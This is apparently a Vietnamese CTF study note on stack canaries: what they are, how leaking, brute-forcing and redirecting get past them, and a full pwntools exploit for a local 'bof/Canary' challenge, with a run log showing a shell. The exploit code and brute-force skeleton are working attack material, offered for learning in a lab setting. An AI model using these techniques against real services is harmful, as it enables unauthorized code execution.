# Stack Canary — hiểu & vượt

> Tài liệu học sâu. Exploit dưới đây **verify ra shell** trên bài local `bof/Canary` (no-PIE,
> canary, NX; pwntools 4.15). Nguồn ở cuối.

---

## 1. Canary là gì?

Trình biên dịch chèn một **giá trị ngẫu nhiên** (stack canary / stack guard) **giữa biến cục bộ
và địa chỉ trả về**. Ngay trước khi hàm `ret`, nó kiểm tra canary còn nguyên không; nếu bị sửa
(do BOF đè qua) → gọi `__stack_chk_fail` và **abort** trước khi `ret`.

```asm
mov    rax, QWORD PTR fs:0x28     ; lấy canary từ TLS
mov    [rbp-8], rax               ; đặt ngay dưới saved rbp / ret
...
mov    rax, [rbp-8]
sub    rax, fs:0x28               ; so sánh
jne    __stack_chk_fail           ; khác -> chết
leave ; ret
```

**Đặc điểm vàng để khai thác:** byte thấp nhất của canary **luôn là `\x00`** (ngăn lỗ hổng chuỗi
C leak nó bằng `%s`/`strcpy`). 8 byte canary = `00 XX XX XX XX XX XX XX`.

---

## 2. Vì sao không BOF thẳng được

BOF tràn qua canary để đè `ret` → canary bị sửa → `__stack_chk_fail` → **chết trước khi `ret`**.
Muốn ghi đè `ret`, payload **buộc phải chứa đúng giá trị canary** ở đúng vị trí → ta cần **biết
canary**.

---

## 3. Các cách vượt canary

| Cách | Khi nào | Ý tưởng |
|------|---------|---------|
| **Leak canary** rồi ghi lại đúng | có đường in bộ nhớ (fmt string, echo buffer, OOB read) | đọc canary, nhét lại đúng chỗ trong payload |
| **Brute từng byte** | **forking server** (canary cố định mỗi fork con) | đoán 1 byte/lần, đúng thì không crash → 256×7 lần |
| **Ghi đè chính xác, giữ nguyên canary** | overflow có kiểm soát độ dài | chỉ ghi tới trước canary, hoặc partial |
| **Nhảy hướng khác** (không qua `ret`) | có con trỏ hàm/GOT ghi được | tránh đụng canary hoàn toàn |

Bài này dùng **leak** (kiểu "đè byte `\0`").

---

## 4. Kỹ thuật leak "đè byte `\0`" (phổ biến nhất)

Vì canary bắt đầu bằng `\x00`, một lệnh in chuỗi (`printf("%s")` / echo buffer) gặp `\0` là
**dừng** → bình thường **không lộ** canary. Mẹo:

1. Ghi đè **đúng byte `\0`** của canary bằng **1 byte non-null** (vd `'A'`).
2. Khi chương trình **in lại buffer**, nó không dừng ở canary nữa → in tràn sang **7 byte canary
   còn lại**.
3. Đọc 7 byte đó, **ghép `\x00`** vào đầu → khôi phục canary đầy đủ.

```python
canary = u64(b"\x00" + leaked_7_bytes)   # LSB luôn \0
```

---

## 5. Writeup pwnld-style (bài `bof/Canary`, verify ra shell)

Bố cục: chương trình đọc **`name`** (buf tại `rbp-0x130`, cách canary **296**) rồi **in lại**;
sau đó đọc **`feedback`** (buf tại `rbp-0x110`, cách canary **264**). → **leak** qua `name`,
**overflow** qua `feedback`. `win()` = `system("/bin/sh")`.

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *

context.binary = exe = ELF("./canary", checksec=False)
set_remote("host", 0)
p = start()

NAME_OFF = 296     # name buf -> canary
FB_OFF   = 264     # feedback buf -> canary  (khác buffer, khác offset!)

### Stage 1: leak canary — đè byte \0 của canary bằng 1 'A' để printf in tràn
sa("Your name: ", b"A"*(NAME_OFF + 1))     # +1 = đè đúng byte \0
ru(b"A"*(NAME_OFF + 1))                      # ăn hết phần 'A' echo lại
canary = uu64(b"\x00" + rc(7))               # 7 byte sau 'A' = canary[1:]; ghép \0
li(f"canary = {hex(canary)}")
assert canary & 0xff == 0, "canary phải tận cùng \\x00 — sai offset leak"

### Stage 2: overflow feedback, đặt canary đúng chỗ rồi ret -> win
sa("Your feedback: ", flat(
    b"A"*FB_OFF,
    canary,                 # canary nguyên vẹn -> qua được kiểm tra
    0xdeadbeef,             # saved rbp (không quan trọng ở đây)
    exe.sym.win + 8,        # +8: nhảy SAU prologue của win -> né lệch 16-byte (movaps)
))

ia()
```

**Vì sao `win + 8`:** vào thẳng `win` (qua `ret`) làm `rsp` lệch 16-byte → `system` crash ở
`movaps`. Nhảy `win+8` bỏ qua `endbr64 + push rbp + mov rbp,rsp` (8 byte prologue) → stack căn
đúng, khỏi cần gadget `ret` phụ. (Tương đương chèn 1 `ret` như [stack_pivot.md](stack_pivot.md#5-hai-cạm-bẫy-đều-verify-được-trên-demo).)

**Log chạy thật:**
```
canary = 0xdbd8780bbbc15800        <- tận cùng 00 (đúng)
$ id
uid=1000(ld) ...                    <- có shell
```

---

## 6. Cạm bẫy

- **Giữ `\x00` khi ghép** canary (`b"\x00" + 7_byte`) — quên là sai 1 byte → `__stack_chk_fail`.
- **Hai buffer / hai offset**: leak và overflow có thể ở buffer khác nhau → dò riêng, đừng dùng
  chung offset (bài này 296 vs 264).
- **Canary đổi mỗi lần chạy** (không forking): phải leak **trong cùng một tiến trình** rồi mới
  overflow (như trên). Leak run này không dùng cho run khác.
- **Forking server**: canary **cố định giữa các fork** → brute từng byte (giữ byte đúng khi
  không crash). Dùng [`retry/`](../../exploits/pwn/retry/) để tự lặp.
- **Căn lề** như mọi ret2libc/system.

---

## 7. Brute canary (forking) — khung

```python
canary = b"\x00"            # byte đầu đã biết là \0
for _ in range(7):
    for b in range(256):
        if try_byte(canary + bytes([b])):   # gửi, KHÔNG crash = đúng
            canary += bytes([b]); break
# try_byte: gửi pad + canary_thử; nếu còn sống/không '__stack_chk_fail' -> True
```
→ tối đa 7×256 lần. Chỉ dùng khi **canary cố định giữa các kết nối** (forking).

---

## 8. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **`bof/Canary`** (local) | ⭐⭐ | leak "đè byte \0" + ret2win | **§5** verify ra shell (có `solve.py` sẵn) |
| **fmt string leak canary** | ⭐⭐ | leak canary bằng `%N$p` | xem [fmtstr.md](fmtstr.md); canary là 1 ô trên stack |
| **Forking + brute canary** | ⭐⭐⭐ | brute từng byte | §7 + [`retry/`](../../exploits/pwn/retry/) |

**Lộ trình:** `bof/Canary` (leak đè-\0) → leak canary bằng format string → brute trên forking server.

---

## Nguồn tham khảo

- ir0nstone — *Stack Canaries*:
  <https://ir0nstone.gitbook.io/notes/types/stack/canaries>
- HackTricks — *Stack Canaries bypass*:
  <https://book.hacktricks.xyz/binary-exploitation/common-binary-protections-and-bypasses/stack-canaries>
